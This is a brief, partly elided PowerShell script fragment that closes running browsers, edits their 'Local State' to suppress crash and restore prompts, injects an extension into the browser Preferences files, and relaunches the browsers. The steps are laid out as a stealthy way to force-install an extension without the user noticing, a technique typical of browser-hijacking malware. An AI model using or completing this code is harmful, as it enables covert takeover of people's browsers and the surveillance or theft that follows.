...
# STEP 1: Kill all target browsers FIRST so they release Preferences files.
# Chrome flushes in-memory prefs to disk on shutdown â€” if we write first then
# kill, Chrome's flush overwrites our changes.
...
# STEP 2: Patch Local State to suppress crash / restore dialog
foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

# STEP 3: Now inject extension into Preferences (browser is fully closed)
$injected = @()
foreach ($b in $browsers) {
...
# STEP 4: Relaunch browsers that were running
if ($wasRunning.Count -gt 0) {
    Start-Sleep 1
    foreach ($b in $wasRunning) {
